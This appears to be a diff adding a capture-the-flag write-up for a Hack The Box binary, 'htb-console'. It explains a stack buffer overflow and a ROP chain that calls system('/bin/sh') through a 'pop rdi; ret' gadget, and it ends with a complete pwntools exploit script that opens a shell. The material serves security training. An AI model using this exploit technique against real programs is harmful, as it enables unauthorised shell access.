@@ -1,0 +1,34 @@
+When looking at the binary you will notice the buffer overflow is when the command is flag
+
+After that there exists a function that uses system("date") for its purpose (we will use the address of system from there)
+
+if you search for /bin/sh you will not find it (not even cat flag.txt). But there is a command(hof) where you can register yourself
+use the string "/bin/sh\0" over there 
+
+since its a 64-bit binary arguments are passed through registers(in 32-bit its passed through stack)
+so rop is to be used to get "pop rdi;ret"
+
+rdi is generally the first argument when a function is called, it has to be made to "/bin/sh" from "date"
+so pop whatever is in rdi and then push /bin/sh(address of where it is saved) and then call the system function
+
+this will trigger system("/bin/sh")
+
+
+from pwn import *
+
+elf=context.binary = ELF('./htb-console')
+rop=ROP([elf])
+p=elf.process()
+p.recv()
+p.sendline(b'hof')
+p.recv()
+p.sendline(b'/bin/sh\0')
+p.recv()
+p.sendline(b'flag')
+p.recv()
+
+rdi =  rop.find_gadget("pop rdi;ret".split(';'))[0]
+
+payload = b"a"*0x18 + p64(rdi) + p64(0x4040b0) + p64(0x401381)
+p.sendline(payload)
+p.interactive()
